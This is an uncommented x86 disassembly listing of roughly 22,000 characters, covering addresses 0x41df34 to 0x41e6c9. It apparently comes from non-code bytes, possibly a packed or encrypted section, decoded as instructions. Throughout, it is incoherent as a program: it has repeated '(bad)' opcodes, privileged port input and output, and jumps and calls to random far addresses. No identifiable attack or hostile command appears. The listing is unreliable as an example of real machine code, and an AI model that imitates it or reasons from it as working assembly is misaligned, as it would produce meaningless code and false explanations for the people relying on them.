  41df34:	addr16 pop ecx
  41df36:	cmp    dh,bl
  41df38:	xor    al,0x1
  41df3a:	js     0x41df6f
  41df3c:	sbb    al,0xea
  41df3e:	jo     0x41df24
  41df40:	cmp    DWORD PTR gs:[ebp-0x5143cfa5],ebx
  41df47:	outs   dx,DWORD PTR ds:[esi]
  41df48:	das    
  41df49:	mov    bl,0x54
  41df4b:	cmp    DWORD PTR [edi+edx*8-0x1beba8cb],edx
  41df52:	pop    ebx
  41df53:	pop    ebp
  41df54:	mov    DWORD PTR [edx+0xb],esp
  41df57:	sub    al,0x28
  41df59:	cld    
  41df5a:	fldcw  WORD PTR [edx]
  41df5c:	mov    edx,0xff059796
  41df61:	adc    al,0xc9
  41df63:	and    eax,esp
  41df65:	inc    ebx
  41df67:	cmp    dh,0x8d
  41df6a:	jg     0x41dfcc
  41df6c:	outs   dx,BYTE PTR ds:[esi]
  41df6d:	dec    edi
  41df6e:	sar    ebx,cl
  41df70:	dec    esp
  41df71:	inc    eax
  41df72:	scas   eax,DWORD PTR es:[edi]
  41df73:	push   esi
  41df74:	fnstenv [eax-0x72a2c68]
  41df7a:	sbb    DWORD PTR [ecx+edx*2-0x1faa611],eax
  41df81:	jmp    0x41df94
  41df83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df84:	pop    edi
  41df85:	lods   al,BYTE PTR ds:[esi]
  41df86:	data16 mov BYTE PTR [esi-0x34],ch
  41df8a:	rcl    BYTE PTR [ebp+ecx*4-0x57],1
  41df8e:	in     eax,dx
  41df8f:	jmp    0xd504b6fe
  41df94:	cmp    eax,0x1f04b8f8
  41df99:	mov    al,ds:0x9d65c08c
  41df9e:	out    0x79,eax
  41dfa0:	cdq    
  41dfa1:	pusha  
  41dfa2:	xor    eax,0x35744d41
  41dfa7:	add    edi,DWORD PTR [edx-0x3673d8ba]
  41dfad:	add    ebx,DWORD PTR ds:0x28bcdb1a
  41dfb3:	adc    esp,eax
  41dfb5:	mov    bh,0xb8
  41dfb7:	cdq    
  41dfb8:	inc    esi
  41dfb9:	or     eax,0x4ce42f1f
  41dfbe:	mov    ah,ch
  41dfc0:	test   al,0xbe
  41dfc2:	push   0xc1e88071
  41dfc7:	dec    BYTE PTR [ebp-0x3f6076bb]
  41dfcd:	in     eax,0xe9
  41dfcf:	out    dx,al
  41dfd0:	call   0xe37e:0x664e40cc
  41dfd7:	pusha  
  41dfd8:	pop    edi
  41dfd9:	push   esp
  41dfda:	outs   dx,DWORD PTR ds:[esi]
  41dfdb:	std    
  41dfdc:	fcomp  QWORD PTR [edi+esi*8+0x61]
  41dfe0:	sub    cl,cl
  41dfe2:	push   0x5eacc957
  41dfe7:	loope  0x41dfe6
  41dfe9:	inc    ecx
  41dfea:	lahf   
  41dfeb:	pop    ss
  41dfec:	jecxz  0x41e043
  41dfee:	adc    edi,DWORD PTR [edi]
  41dff0:	ja     0x41dff3
  41dff2:	jl     0x41dfb6
  41dff4:	sub    edi,edx
  41dff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dff7:	pop    es
  41dff8:	pop    ebx
  41dff9:	int    0x5e
  41dffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dffc:	dec    esp
  41dffd:	add    ch,cl
  41dfff:	das    
  41e000:	xlat   BYTE PTR ds:[ebx]
  41e001:	fistp  DWORD PTR [ebx+ecx*2+0x717b6a6d]
  41e008:	mov    eax,ds:0x26c66916
  41e00d:	(bad)  
  41e00e:	cmp    DWORD PTR [ebx],ebp
  41e010:	inc    edx
  41e011:	call   0x57eb6836
  41e016:	daa    
  41e017:	lods   al,BYTE PTR ds:[esi]
  41e018:	aas    
  41e019:	cld    
  41e01a:	mov    bl,0x9e
  41e01c:	mov    al,ds:0xb35cfe13
  41e021:	cmp    eax,0x4f649639
  41e026:	mov    edi,0x58beeb50
  41e02b:	cmp    BYTE PTR [eax+0x6141c387],bl
  41e031:	shl    esp,1
  41e033:	fsubr  QWORD PTR [ebx+0x3e5be975]
  41e039:	mov    ecx,0x6662baea
  41e03e:	jmp    0x3d7a7d60
  41e043:	out    0x62,al
  41e045:	sbb    DWORD PTR [esi],ecx
  41e047:	pop    ss
  41e048:	sub    dl,ch
  41e04a:	shl    BYTE PTR [ebx-0x31],cl
  41e04d:	adc    ecx,DWORD PTR [edi+0xa]
  41e050:	rcl    DWORD PTR [eax+0x218ed18b],0x63
  41e057:	and    ebp,DWORD PTR [eax-0x21d5e996]
  41e05d:	lock imul esp,DWORD PTR [ebp+0x5a],0xffffffdf
  41e062:	mov    fs,ebp
  41e064:	sbb    DWORD PTR [edx],eax
  41e066:	loop   0x41dfed
  41e068:	push   edi
  41e069:	lods   al,BYTE PTR ds:[esi]
  41e06a:	iret   
  41e06b:	js     0x41dff0
  41e06d:	pop    ecx
  41e06e:	cmp    ecx,DWORD PTR [eax]
  41e070:	cli    
  41e071:	imul   edx,DWORD PTR [edi-0x5a],0x7e
  41e075:	fs jmp 0x41dffe
  41e078:	dec    esp
  41e079:	fisubr WORD PTR [esi-0x1814a094]
  41e07f:	arpl   WORD PTR [eax],di
  41e081:	out    dx,al
  41e082:	ror    DWORD PTR [edx-0x40],1
  41e085:	fwait
  41e086:	push   ebp
  41e087:	cli    
  41e088:	mov    ebx,0xb27f4e6e
  41e08d:	out    0x22,eax
  41e08f:	push   ss
  41e090:	loop   0x41e0b6
  41e092:	mov    bh,0xf
  41e094:	mov    ebx,0x89c1e86c
  41e099:	jo     0x41e0a8
  41e09b:	push   cs
  41e09c:	jmp    edx
  41e09e:	(bad)  
  41e09f:	loope  0x41e045
  41e0a1:	daa    
  41e0a2:	sbb    bl,BYTE PTR [ecx-0x42]
  41e0a5:	adc    DWORD PTR [edx-0x62011a63],edi
  41e0ab:	xor    DWORD PTR [edx-0xdc53b29],ebx
  41e0b1:	jecxz  0x41e0c4
  41e0b3:	aam    0xbf
  41e0b5:	(bad)  
  41e0b6:	out    dx,eax
  41e0b7:	inc    edx
  41e0b8:	mov    ?,WORD PTR [ebp+0x3b]
  41e0bb:	xor    DWORD PTR gs:[ecx-0x49afa8bb],esi
  41e0c2:	push   ebx
  41e0c3:	add    BYTE PTR [ebp+ebx*4-0x39],ch
  41e0c7:	cld    
  41e0c8:	ins    BYTE PTR es:[edi],dx
  41e0c9:	and    eax,0xb3a6dadf
  41e0ce:	jmp    FWORD PTR [edi]
  41e0d0:	or     DWORD PTR [edi+0x7980ef53],0x2d186319
  41e0da:	nop
  41e0db:	retf   
  41e0dc:	aas    
  41e0dd:	xchg   BYTE PTR [ebx+eax*8-0xf],bl
  41e0e1:	inc    esi
  41e0e2:	(bad)  
  41e0e3:	cmp    edi,DWORD PTR [edi]
  41e0e5:	stc    
  41e0e6:	or     DWORD PTR [eax+0x66dd4ab4],esi
  41e0ec:	mov    ebp,0x2a85d7c5
  41e0f1:	test   BYTE PTR ds:0xa04850ed,bh
  41e0f7:	mov    dh,0x3d
  41e0f9:	jae    0x41e114
  41e0fb:	add    DWORD PTR [esi+0x40],0x6d80752e
  41e102:	std    
  41e103:	xor    BYTE PTR [edx],bh
  41e105:	ja     0x41e10e
  41e107:	sbb    eax,0x4509ae74
  41e10c:	scas   eax,DWORD PTR es:[edi]
  41e10d:	jp     0x41e0b6
  41e10f:	mov    ch,0x56
  41e111:	ret    
  41e112:	mov    ds:0x4ea4309c,eax
  41e117:	test   al,0xd2
  41e119:	and    ebp,ebx
  41e11b:	xchg   edx,eax
  41e11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e11d:	sbb    eax,0xd97ebc92
  41e122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e123:	pop    es
  41e124:	sbb    esp,DWORD PTR [eax+0x2a94e143]
  41e12a:	scas   al,BYTE PTR es:[edi]
  41e12b:	dec    ecx
  41e12c:	and    BYTE PTR [esp+esi*4-0x3dea8636],dh
  41e133:	aam    0xc3
  41e135:	fs pop ds
  41e137:	shr    BYTE PTR [ebx+edx*1-0x4a],1
  41e13b:	int3   
  41e13c:	retf   
  41e13d:	adc    al,dl
  41e13f:	adc    esp,DWORD PTR [ecx+0x3533618b]
  41e145:	cdq    
  41e146:	sbb    BYTE PTR [ebx-0x3d58b77],0x5c
  41e14d:	cmp    ecx,0x17
  41e150:	jle    0x41e15f
  41e152:	dec    esi
  41e153:	mov    ds:0x48f2d3f9,al
  41e158:	inc    edx
  41e159:	sub    eax,0xfe403cfa
  41e15e:	mov    eax,0x49e2af3f
  41e163:	jns    0x41e1d8
  41e165:	int3   
  41e166:	fwait
  41e167:	sbb    DWORD PTR [esi-0x6a35eb0f],edi
  41e16d:	and    DWORD PTR [ecx],eax
  41e16f:	mov    bh,0xdc
  41e171:	les    edi,FWORD PTR [esi+0x4d23ac9c]
  41e177:	or     ebx,ecx
  41e179:	mov    edi,0xe7154165
  41e17e:	ret    0xf292
  41e181:	das    
  41e182:	cmp    BYTE PTR [eax],0xaa
  41e185:	or     DWORD PTR [ebp-0x577b8b84],eax
  41e18b:	jnp    0x41e161
  41e18d:	mov    eax,edi
  41e18f:	sbb    eax,0xecadcf6b
  41e194:	mov    ebp,0xed5d3921
  41e199:	in     al,0x55
  41e19b:	pop    eax
  41e19c:	or     BYTE PTR [ebx],cl
  41e19e:	dec    esi
  41e19f:	shl    DWORD PTR [eax+0x2a],cl
  41e1a2:	lea    ecx,[edx+0x44e80b86]
  41e1a8:	arpl   WORD PTR [ebx],ax
  41e1aa:	sub    BYTE PTR [esi-0x7c34050e],0x69
  41e1b1:	add    dh,BYTE PTR [eax-0x6f81c003]
  41e1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1b8:	add    ch,dh
  41e1ba:	loop   0x41e16c
  41e1bc:	dec    esp
  41e1bd:	out    0xa1,al
  41e1bf:	scas   eax,DWORD PTR es:[edi]
  41e1c0:	sahf   
  41e1c1:	or     esi,ebx
  41e1c3:	ret    
  41e1c4:	out    0x44,al
  41e1c6:	fimul  DWORD PTR [edx+0x74150a8a]
  41e1cc:	call   0x99386dcc
  41e1d1:	retf   0x6491
  41e1d4:	retf   0xbc6b
  41e1d7:	inc    eax
  41e1d8:	je     0x41e170
  41e1da:	dec    ebp
  41e1db:	jmp    0x1a5d007e
  41e1e0:	push   ebp
  41e1e1:	cmp    al,0xa
  41e1e3:	mov    ebp,0x3611ff8e
  41e1e8:	dec    edi
  41e1e9:	lods   al,BYTE PTR ds:[esi]
  41e1ea:	mov    ds:0x8e8cf90d,al
  41e1ef:	repnz lods al,BYTE PTR ds:[esi]
  41e1f1:	jl     0x41e190
  41e1f3:	aad    0x92
  41e1f5:	push   ecx
  41e1f6:	lock je 0x41e1fe
  41e1f9:	ja     0x41e265
  41e1fb:	cdq    
  41e1fc:	dec    esp
  41e1fd:	inc    ebx
  41e1fe:	mov    ds,edi
  41e200:	jmp    0x41e1ae
  41e202:	mov    bl,0xe2
  41e204:	add    cl,ch
  41e206:	mov    esi,0x7df76c7b
  41e20b:	dec    ebp
  41e20c:	pop    edx
  41e20d:	repnz outs dx,BYTE PTR ds:[esi]
  41e20f:	adc    DWORD PTR [esi+esi*4+0xae4ebd9],ebp
  41e216:	out    0x1b,al
  41e218:	cmp    bh,dh
  41e21a:	mov    ss,eax
  41e21c:	mov    BYTE PTR [eax+edx*8],bh
  41e21f:	(bad)  
  41e221:	jp     0x41e218
  41e223:	and    dl,dl
  41e225:	addr16 push esi
  41e227:	ja     0x41e1d6
  41e229:	out    0xc6,al
  41e22b:	cmp    ch,BYTE PTR [edx-0x730a831f]
  41e231:	or     DWORD PTR [eax+0xbbf9a59],ebx
  41e237:	cmp    al,dh
  41e239:	je     0x41e266
  41e23b:	gs pop esp
  41e23d:	mov    dh,0x14
  41e23f:	mov    es,WORD PTR [esi*8+0x7b38dc7]
  41e246:	popf   
  41e247:	mov    al,ds:0x2e8f0bfb
  41e24c:	clc    
  41e24d:	ja     0x41e296
  41e24f:	xchg   esi,eax
  41e250:	ins    BYTE PTR es:[edi],dx
  41e251:	inc    ebx
  41e252:	pop    edi
  41e253:	jge    0x41e211
  41e255:	mov    dl,0x71
  41e257:	sbb    DWORD PTR [ebp-0x35],ebp
  41e25a:	sahf   
  41e25b:	dec    edx
  41e25c:	mov    ds:0x5dd69153,eax
  41e261:	dec    eax
  41e262:	jb     0x41e28d
  41e264:	fadd   QWORD PTR [ecx-0x45c65a]
  41e26a:	cli    
  41e26b:	mov    al,0xe1
  41e26d:	out    0x5b,eax
  41e26f:	loopne 0x41e265
  41e271:	cmc    
  41e272:	addr16 dec ebp
  41e274:	mov    ds:0xad07e20d,eax
  41e279:	adc    al,0xca
  41e27b:	sub    al,0x8f
  41e27d:	jbe    0x41e24f
  41e27f:	and    eax,0xe84a6a09
  41e284:	cmp    ah,BYTE PTR [esi+edx*2-0x56]
  41e288:	cwde   
  41e289:	shr    DWORD PTR [eax],0x96
  41e28c:	stc    
  41e28d:	sar    DWORD PTR [ebx-0x53332b9c],0xae
  41e294:	test   BYTE PTR [esi+0x71fb369c],al
  41e29a:	hlt    
  41e29b:	jp     0x41e299
  41e29d:	jnp    0x41e276
  41e29f:	ss stc 
  41e2a1:	add    dh,BYTE PTR [ebx+0x6b29a403]
  41e2a7:	push   ebx
  41e2a8:	fst    DWORD PTR [ebx]
  41e2aa:	add    ch,BYTE PTR [edi+0xc]
  41e2ad:	popa   
  41e2ae:	push   eax
  41e2af:	test   DWORD PTR [edx],0x8bc191ab
  41e2b5:	inc    ebx
  41e2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2b7:	shl    DWORD PTR [ebx],0x76
  41e2ba:	es std 
  41e2bc:	in     al,0x3e
  41e2be:	mov    ebx,0x2cf3ab6e
  41e2c3:	push   edx
  41e2c4:	push   0x55e1657d
  41e2c9:	mov    ds:0x616edc6b,eax
  41e2ce:	and    esp,DWORD PTR [eax+0x51]
  41e2d1:	mov    al,ds:0x945cdc9b
  41e2d6:	enter  0x2d04,0xac
  41e2da:	ins    DWORD PTR es:[edi],dx
  41e2db:	sub    ecx,DWORD PTR [eax+ecx*8]
  41e2de:	xchg   ebx,eax
  41e2df:	loop   0x41e26e
  41e2e1:	adc    ch,ah
  41e2e3:	jmp    0x1692:0xa0600e8e
  41e2ea:	jnp    0x41e334
  41e2ec:	lods   al,BYTE PTR ds:[esi]
  41e2ed:	jnp    0x41e291
  41e2ef:	scas   eax,DWORD PTR es:[edi]
  41e2f0:	jbe    0x41e2b6
  41e2f2:	sub    eax,0x5fa1d3aa
  41e2f7:	stos   DWORD PTR es:[edi],eax
  41e2f8:	fadd   DWORD PTR [ebx+0x50]
  41e2fb:	mov    dl,0xa6
  41e2fd:	jmp    0x99ae34bf
  41e302:	sub    eax,0x6c41b30d
  41e307:	pop    edx
  41e308:	sub    eax,0xb1ec1bb
  41e30d:	jge    0x41e369
  41e30f:	xor    BYTE PTR [ebx],bh
  41e311:	jmp    DWORD PTR [ecx]
  41e313:	and    DWORD PTR [edi+0xbec053b],ebx
  41e319:	cmc    
  41e31a:	out    dx,eax
  41e31b:	std    
  41e31c:	cli    
  41e31d:	xor    DWORD PTR [esi+0x6394d1c],edi
  41e323:	sbb    eax,0x4444310c
  41e328:	or     dl,BYTE PTR [esi-0x2af78324]
  41e32e:	push   eax
  41e32f:	inc    ecx
  41e330:	icebp  
  41e331:	(bad)  
  41e333:	dec    ebx
  41e334:	dec    ebp
  41e335:	outs   dx,DWORD PTR ds:[esi]
  41e336:	ins    BYTE PTR es:[edi],dx
  41e337:	stc    
  41e338:	jle    0x41e3a9
  41e33a:	in     eax,0x4e
  41e33c:	add    al,0xfe
  41e33e:	daa    
  41e33f:	std    
  41e340:	or     DWORD PTR [edi+0x5c1e5c27],edi
  41e346:	mov    edx,0xafa9d0d3
  41e34b:	popa   
  41e34c:	push   ebx
  41e34d:	push   esp
  41e34e:	cmp    al,0x76
  41e350:	cmp    eax,0xdfbd516a
  41e355:	or     BYTE PTR ds:0xe06d75b0,dh
  41e35b:	popa   
  41e35c:	jecxz  0x41e379
  41e35e:	mov    ch,BYTE PTR [eax+0x72]
  41e361:	mov    cl,0xfd
  41e363:	popa   
  41e364:	and    al,BYTE PTR [ebx]
  41e366:	cs jmp 0x810d:0x834db948
  41e36e:	or     eax,0x8aa314e9
  41e373:	push   esp
  41e374:	push   esi
  41e375:	adc    edi,edx
  41e377:	mov    BYTE PTR [ecx+ebp*1-0x21b1b3e2],0x12
  41e37f:	or     eax,0x415dbc87
  41e384:	popa   
  41e385:	mov    ebx,0x6db16f24
  41e38a:	mov    bl,0xa
  41e38c:	loop   0x41e399
  41e38e:	dec    ebp
  41e38f:	mov    eax,0x165fe9bf
  41e394:	popa   
  41e395:	jge    0x41e403
  41e397:	add    eax,0xfcf1c311
  41e39c:	sub    dl,ch
  41e39e:	fwait
  41e39f:	neg    BYTE PTR [eax-0x58b7748b]
  41e3a5:	pop    esi
  41e3a6:	dec    edi
  41e3a7:	sar    al,cl
  41e3a9:	dec    DWORD PTR [edx]
  41e3ab:	jle    0x41e38f
  41e3ad:	pop    eax
  41e3ae:	dec    edx
  41e3af:	inc    esp
  41e3b0:	div    DWORD PTR [ebx]
  41e3b2:	jns    0x41e386
  41e3b4:	(bad)
  41e3b7:	jmp    0xec7b7bb2
  41e3bc:	push   esp
  41e3bd:	fs lock push ecx
  41e3c0:	ret    0x4c99
  41e3c3:	cmp    bl,BYTE PTR [ecx+0x63]
  41e3c6:	(bad)  
  41e3c7:	and    BYTE PTR es:[edx],bl
  41e3ca:	mov    al,ds:0x67fc94d8
  41e3cf:	sar    BYTE PTR [ebx+0x56d91993],1
  41e3d5:	stc    
  41e3d6:	cmp    eax,0xb569d614
  41e3db:	adc    BYTE PTR [edx],0x80
  41e3de:	addr16 xchg esp,eax
  41e3e0:	mov    esp,0x22b6da72
  41e3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e6:	jle    0x41e3c6
  41e3e8:	push   cs
  41e3e9:	mov    ecx,0xf8e2266f
  41e3ee:	sbb    eax,0x9b3e00e8
  41e3f3:	and    ebp,esi
  41e3f5:	cmp    DWORD PTR [ecx-0x7daa42cf],ecx
  41e3fb:	ret    
  41e3fc:	push   ds
  41e3fd:	jge    0x41e46c
  41e3ff:	adc    eax,0x6d0f8305
  41e404:	and    eax,ecx
  41e406:	call   0x895c:0x4b09e446
  41e40d:	mov    edx,0x284a5116
  41e412:	xchg   ebp,eax
  41e413:	pushf  
  41e414:	sbb    al,0x3f
  41e416:	cli    
  41e417:	sub    al,0xb6
  41e419:	xchg   BYTE PTR [ebx],cl
  41e41b:	daa    
  41e41c:	popa   
  41e41d:	adc    al,0xea
  41e41f:	jns    0x41e42b
  41e421:	mov    eax,ds:0x2ce3fb78
  41e426:	fcmovne st,st(4)
  41e428:	arpl   WORD PTR [eax],di
  41e42a:	(bad)  
  41e42b:	rol    esp,1
  41e42d:	fwait
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e430:	dec    eax
  41e431:	bound  edx,QWORD PTR [eax+0x74]
  41e434:	fnsave [edx+0x5e]
  41e437:	pop    esi
  41e438:	cmc    
  41e439:	clc    
  41e43a:	sbb    eax,0x5c877818
  41e43f:	and    BYTE PTR [ebp-0x2d],bl
  41e442:	lea    esi,[esi-0x27127a]
  41e448:	sub    eax,0x6f49c187
  41e44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44e:	xor    esp,eax
  41e450:	leave  
  41e451:	jmp    0x1e55248e
  41e456:	cwde   
  41e457:	mov    BYTE PTR [esi-0x2be47645],ch
  41e45d:	out    0xa2,al
  41e45f:	jo     0x41e4d4
  41e461:	ja     0x41e46f
  41e463:	lock pop es
  41e465:	ins    DWORD PTR es:[edi],dx
  41e466:	or     esp,esp
  41e468:	xor    bl,dl
  41e46a:	or     DWORD PTR [edi],edi
  41e46c:	sbb    BYTE PTR [esp+edi*2+0x63],bl
  41e470:	push   edi
  41e471:	or     BYTE PTR [eax],al
  41e473:	fist   WORD PTR [ebp+0x4fe4f275]
  41e479:	stos   BYTE PTR es:[edi],al
  41e47a:	and    BYTE PTR [ecx],dh
  41e47c:	inc    esi
  41e47d:	into   
  41e47e:	xchg   esp,eax
  41e47f:	or     BYTE PTR [ebx+0x37d5588e],ch
  41e485:	jecxz  0x41e4c9
  41e487:	inc    eax
  41e488:	lahf   
  41e489:	pop    esi
  41e48a:	inc    ebx
  41e48b:	lahf   
  41e48c:	jnp    0x41e4f7
  41e48e:	popa   
  41e48f:	iret   
  41e490:	rcr    al,1
  41e492:	shl    BYTE PTR ds:[edi],cl
  41e495:	push   0xffffffcd
  41e497:	sub    ecx,DWORD PTR [ebx]
  41e499:	daa    
  41e49a:	cli    
  41e49b:	lahf   
  41e49c:	scas   al,BYTE PTR es:[edi]
  41e49d:	(bad)  [eax+0x0]
  41e4a0:	sbb    BYTE PTR [edi-0x66],bl
  41e4a3:	ret    0xb8a7
  41e4a6:	popf   
  41e4a7:	mov    esi,0x4463f498
  41e4ac:	and    al,0x5a
  41e4ae:	add    BYTE PTR [edx+eiz*8],cl
  41e4b1:	loope  0x41e434
  41e4b3:	outs   dx,DWORD PTR ds:[esi]
  41e4b4:	shr    BYTE PTR [ebx],cl
  41e4b6:	stos   BYTE PTR es:[edi],al
  41e4b7:	fiadd  WORD PTR [ebx]
  41e4b9:	arpl   WORD PTR [ebx-0x34],bx
  41e4bc:	rcl    BYTE PTR [esi+edx*2+0x27],cl
  41e4c0:	and    eax,0xa3a5022f
  41e4c5:	test   BYTE PTR [edx+edi*2+0x7deb2879],bh
  41e4cc:	inc    ecx
  41e4cd:	push   edi
  41e4ce:	out    dx,al
  41e4cf:	cld    
  41e4d0:	cmp    bl,dl
  41e4d2:	pushf  
  41e4d3:	cld    
  41e4d4:	call   0x9a4e719d
  41e4d9:	jae    0x41e4b5
  41e4db:	cmp    DWORD PTR [eax+0x60f63439],0x16
  41e4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e3:	dec    esi
  41e4e4:	mov    esp,0x92d9379b
  41e4e9:	lea    ebp,[edx+0x1f363320]
  41e4ef:	shr    DWORD PTR [ebx-0x3d844d8d],0x63
  41e4f6:	pop    ds
  41e4f7:	xor    al,0x1c
  41e4f9:	shr    ah,1
  41e4fb:	jo     0x41e505
  41e4fd:	scas   al,BYTE PTR es:[edi]
  41e4fe:	mov    ebp,0x4a57009e
  41e503:	jmp    0x41e4e9
  41e505:	ror    DWORD PTR [eax-0x25],cl
  41e508:	sub    dh,BYTE PTR [edx+0x2103071b]
  41e50e:	sub    bl,BYTE PTR [esi+ebp*1-0x1a83fa1e]
  41e515:	sub    BYTE PTR [edx-0x65],ch
  41e518:	sub    bl,BYTE PTR [edi]
  41e51a:	push   ebp
  41e51b:	ficomp DWORD PTR [edi+0x32d01b69]
  41e521:	mov    cl,0x9f
  41e523:	mov    al,0xe
  41e525:	jnp    0x41e51f
  41e527:	retf   0x2b4f
  41e52a:	xchg   DWORD PTR [eax-0x5d13f18a],edx
  41e530:	iret   
  41e531:	xor    al,0xe1
  41e533:	icebp  
  41e534:	into   
  41e535:	xlat   BYTE PTR ds:[ebx]
  41e536:	inc    ebp
  41e537:	inc    ecx
  41e538:	or     cl,BYTE PTR [ebx-0x8]
  41e53b:	xor    ecx,DWORD PTR [esi+ecx*1+0x1d]
  41e53f:	pop    ecx
  41e540:	rcl    BYTE PTR [ebx+0x3492efaa],0x99
  41e547:	scas   eax,DWORD PTR es:[edi]
  41e548:	sahf   
  41e549:	int    0xdf
  41e54b:	je     0x41e59a
  41e54d:	(bad)
  41e550:	or     eax,0xaaad7e8e
  41e555:	(bad)  [edx+eax*4]
  41e558:	dec    edi
  41e559:	scas   al,BYTE PTR es:[edi]
  41e55a:	enter  0x66e,0x20
  41e55e:	and    eax,0x439a755
  41e563:	or     al,BYTE PTR [edx]
  41e565:	imul   ecx,esi,0x7
  41e568:	stos   BYTE PTR es:[edi],al
  41e569:	idiv   DWORD PTR [ebp-0x16]
  41e56c:	cmp    al,0xa8
  41e56e:	cmp    al,BYTE PTR [ebx-0x6d]
  41e571:	daa    
  41e572:	out    0x66,eax
  41e574:	xchg   ecx,eax
  41e575:	sub    edi,DWORD PTR [ebx-0x702198be]
  41e57b:	pop    ecx
  41e57c:	fiadd  WORD PTR [eax]
  41e57e:	mov    ebp,0x98d71dbc
  41e583:	int    0xe0
  41e585:	mov    bl,0xbc
  41e587:	push   edi
  41e588:	cmp    DWORD PTR [eax+esi*4-0xdf65f59],0x8b1ab133
  41e593:	sar    dh,0xa0
  41e596:	sbb    eax,DWORD PTR [eax-0x6c]
  41e599:	pop    ebx
  41e59a:	mov    cl,0x1d
  41e59c:	inc    ebp
  41e59d:	add    BYTE PTR [ebp-0x80],dl
  41e5a0:	sub    DWORD PTR [ebp+0x28b00786],esp
  41e5a6:	out    0x30,eax
  41e5a8:	stos   DWORD PTR es:[edi],eax
  41e5a9:	call   0x13a656c
  41e5ae:	icebp  
  41e5af:	push   esi
  41e5b0:	jae    0x41e57e
  41e5b2:	enter  0xb1ff,0x37
  41e5b6:	adc    eax,0x5fa0e935
  41e5bb:	mov    bh,0x30
  41e5bd:	fwait
  41e5be:	cdq    
  41e5bf:	cmp    al,0x52
  41e5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c2:	out    0xc2,eax
  41e5c4:	push   edi
  41e5c5:	cli    
  41e5c6:	pop    es
  41e5c7:	push   0xf3713b97
  41e5cc:	in     eax,dx
  41e5cd:	loop   0x41e558
  41e5cf:	xchg   ecx,eax
  41e5d0:	jae    0x41e553
  41e5d2:	test   DWORD PTR [eax],ebp
  41e5d4:	cmp    esi,DWORD PTR [ecx+0xfd942c5]
  41e5da:	jno    0x41e651
  41e5dc:	outs   dx,BYTE PTR ds:[esi]
  41e5dd:	int    0x7d
  41e5df:	mov    ch,0x26
  41e5e1:	jb     0x41e652
  41e5e3:	(bad)  
  41e5e4:	push   edx
  41e5e5:	xor    BYTE PTR [bx+si-0x1f09],bl
  41e5ea:	dec    edx
  41e5eb:	out    0xde,eax
  41e5ed:	lock ror BYTE PTR [edx],cl
  41e5f0:	ds pop edx
  41e5f2:	fsub   st,st(0)
  41e5f4:	in     al,dx
  41e5f5:	mov    bh,0x6d
  41e5f7:	and    BYTE PTR [eax+0x5c41ace8],al
  41e5fd:	das    
  41e5fe:	loop   0x41e5d2
  41e600:	sub    al,0x11
  41e602:	ins    DWORD PTR es:[edi],dx
  41e603:	add    eax,DWORD PTR [ebx+0x5f]
  41e606:	adc    ch,bl
  41e608:	or     BYTE PTR [ebp+0x75],al
  41e60b:	add    eax,0x99bcbb4e
  41e610:	jp     0x41e667
  41e612:	ins    BYTE PTR es:[edi],dx
  41e613:	and    dl,ah
  41e615:	test   DWORD PTR [edx+0x50],esi
  41e618:	xor    dl,BYTE PTR [esi+0x4c]
  41e61b:	sub    eax,0xcad09b7b
  41e620:	xchg   esp,eax
  41e621:	out    0x34,al
  41e623:	jmp    0x41e682
  41e625:	or     eax,0xbff75b51
  41e62a:	pop    edx
  41e62b:	ds ins BYTE PTR es:[di],dx
  41e62e:	fisttp WORD PTR [edi+0x5e12141c]
  41e634:	popf   
  41e635:	pop    edx
  41e636:	mov    ds:0xf8dcb010,al
  41e63b:	minps  xmm7,XMMWORD PTR [ebx-0x242a3175]
  41e642:	sub    DWORD PTR [edi+0x47],0xffffffaa
  41e646:	xchg   edx,eax
  41e647:	xor    al,0xe
  41e649:	jae    0x41e649
  41e64b:	fimul  WORD PTR [esi+0x12]
  41e64e:	scas   eax,DWORD PTR es:[edi]
  41e64f:	xchg   DWORD PTR [esi],eax
  41e651:	mov    ebp,0xc041ad
  41e656:	inc    esp
  41e657:	div    DWORD PTR [eax+0x17]
  41e65a:	dec    edx
  41e65b:	push   ecx
  41e65c:	icebp  
  41e65d:	pop    ds
  41e65e:	xchg   edi,eax
  41e65f:	dec    ebx
  41e660:	mov    dl,0xa7
  41e662:	cdq    
  41e663:	ins    BYTE PTR es:[edi],dx
  41e664:	leavew 
  41e666:	or     BYTE PTR [esi+ebp*4-0xccf10cc],dl
  41e66d:	mov    ebx,0x13f57732
  41e672:	dec    ecx
  41e673:	add    eax,0xb4d5bdf4
  41e678:	jo     0x41e66c
  41e67a:	xchg   ecx,eax
  41e67b:	test   BYTE PTR [edx],al
  41e67d:	imul   esi,DWORD PTR [ebp-0x4c590a3],0xe066cdb0
  41e687:	mov    al,ds:0x75b8cb10
  41e68c:	in     eax,0x7b
  41e68e:	popa   
  41e68f:	mov    eax,ds:0xea93601b
  41e694:	fwait
  41e695:	cmp    BYTE PTR [edx],dl
  41e697:	pop    esp
  41e698:	repz jmp 0x41e713
  41e69b:	adc    al,0x64
  41e69d:	pop    es
  41e69e:	sub    bl,BYTE PTR [edx]
  41e6a0:	or     al,0xc7
  41e6a2:	adc    edx,DWORD PTR [ebx+0x19]
  41e6a5:	mov    ebp,0xbd72ec72
  41e6aa:	mov    dl,0x76
  41e6ac:	xor    eax,0xae493dcb
  41e6b1:	jp     0x41e6cc
  41e6b3:	(bad)  
  41e6b4:	int3   
  41e6b5:	xor    bh,al
  41e6b7:	mov    ds:0xcccab10e,al
  41e6bc:	push   ebp
  41e6bd:	je     0x41e6d8
  41e6bf:	xor    DWORD PTR [ebx],eax
  41e6c1:	les    esp,FWORD PTR [ebx+0x13]
  41e6c4:	pop    esi
  41e6c5:	aaa    
  41e6c6:	dec    eax
  41e6c7:	icebp  
  41e6c8:	dec    esp
  41e6c9:	repz (bad) 
